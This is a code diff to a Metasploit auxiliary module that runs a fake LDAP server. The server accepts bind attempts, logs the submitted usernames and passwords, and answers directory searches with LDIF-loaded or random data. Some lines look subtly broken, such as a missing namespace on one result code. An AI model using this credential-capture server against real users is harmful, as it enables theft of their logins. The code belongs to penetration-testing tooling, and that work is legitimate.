@@ -39,6 +39,14 @@ class MetasploitModule < Msf::Auxiliary
         OptPort.new('SRVPORT', [ true, 'The local port to listen on.', '389' ])
       ]
     )
+
+    deregister_options('LDIF_FILE')
+
+    register_advanced_options(
+      [
+        OptPath.new('LDIF_FILE', [ false, 'Directory LDIF file path'])
+      ]
+    )
   end
 
   def run
@@ -68,7 +76,12 @@ class MetasploitModule < Msf::Auxiliary
               result_code = nil
               user_login = pdu.bind_parameters
 
-              if !user_login.name.empty?
+              if user_login.name.empty? || user_login.authentication.empty?
+                state[client][:user] = user_login.name
+                state[client][:pass] = user_login.authentication
+                state[client][:domain] = nil
+                result_code = Net::LDAP::ResultCodeSuccess
+              elsif !user_login.name.empty?
                 if user_login.name =~ /@/
                   pub_info = user_login.name.split('@')
                   if pub_info.length <= 2
@@ -95,6 +108,8 @@ class MetasploitModule < Msf::Auxiliary
                     raise e
                   end
                 else
+                  state[client][:user] = ''
+                  state[client][:domain] = nil
                   result_code = Net::LDAP::ResultCodeInvalidCredentials
                 end
               else
@@ -114,7 +129,7 @@ class MetasploitModule < Msf::Auxiliary
                   domain: state[client][:domain]
                 )
               end
-              print_good("LDAP Login Attempt => From:#{state[client][:name]} Username:#{state[client][:user]} Password:#{state[client][:password]}")
+              print_good("LDAP Login Attempt => From:#{state[client][:name]} Username:#{state[client][:user]} Password:#{state[client][:pass]}")
               result_code = Net::LDAP::ResultCodeAuthMethodNotSupported if result_code.nil?
               service.encode_ldap_response(
                 pdu.message_id,
@@ -123,6 +138,27 @@ class MetasploitModule < Msf::Auxiliary
                 Net::LDAP::ResultStrings[result_code],
                 Net::LDAP::PDU::BindResult
               )
+            when Net::LDAP::PDU::SearchRequest # search request
+              # Perform query against some loaded LDIF structure
+              filter = Net::LDAP::Filter.parse_ldap_filter(pdu.search_parameters[:filter])
+              attrs = pdu.search_parameters[:attributes].empty? ? :all : pdu.search_parameters[:attributes]
+              res = search_res(filter, pdu.message_id, attrs)
+              if res.nil? || res.empty?
+                result_code = Net::LDAP::ResultCodeNoSuchObject
+              else
+                client.write(res)
+                result_code = Net::LDAP::ResultCodeSuccess
+              end
+              service.encode_ldap_response(
+                pdu.message_id,
+                result_code,
+                '',
+                Net::LDAP::ResultStrings[result_code],
+                Net::LDAP::PDU::SearchResult
+              )
+            when Net::LDAP::PDU::UnbindRequest
+              client.close
+              nil
             else
               result_code = Net::LDAP::ResultCodeUnwillingToPerform
               service.encode_ldap_response(
@@ -141,13 +177,11 @@ class MetasploitModule < Msf::Auxiliary
                          1,
                          Net::LDAP::ResultCodeUnwillingToPerform,
                          '',
-                         Net::LDAP::ResultStrings[result_code],
+                         Net::LDAP::ResultStrings[ResultCodeUnwillingToPerform],
                          Net::LDAP::PDU::BindResult
                        ))
       print_error("Failed to handle LDAP request due to #{e}")
     end
-  ensure
-    client.close
   end
 
   def report_cred(opts)
@@ -176,5 +210,40 @@ class MetasploitModule < Msf::Auxiliary
     }.merge(service_data)
 
     create_credential_login(login_data)
+  end
+
+  def search_res(filter, msgid, attrflt = :all)
+    if @ldif.nil? || @ldif.empty?
+      attrs = []
+      if attrflt.is_a?(Array)
+        attrflt.each do |at|
+          attrval = [Rex::Text.rand_text_alphanumeric(10)].map(&:to_ber).to_ber_set
+          attrs << [at.to_ber, attrval].to_ber_sequence
+        end
+        dn = "dc=#{Rex::Text.rand_text_alphanumeric(10)},dc=#{Rex::Text.rand_text_alpha(4)}"
+        appseq = [
+          dn.to_ber,
+          attrs.to_ber_sequence
+        ].to_ber_appsequence(Net::LDAP::PDU::SearchReturnedData)
+        [msgid.to_ber, appseq].to_ber_sequence
+      end
+    else
+      ldif.map do |bind_dn, entry|
+        next unless filter.match(entry)
+
+        attrs = []
+        entry.each do |k, v|
+          if attrflt == :all || attrflt.include?(k.downcase)
+            attrvals = v.map(&:to_ber).to_ber_set
+            attrs << [k.to_ber, attrvals].to_ber_sequence
+          end
+        end
+        appseq = [
+          bind_dn.to_ber,
+          attrs.to_ber_sequence
+        ].to_ber_appsequence(Net::LDAP::PDU::SearchReturnedData)
+        [msgid.to_ber, appseq].to_ber_sequence
+      end.compact.join
+    end
   end
 end
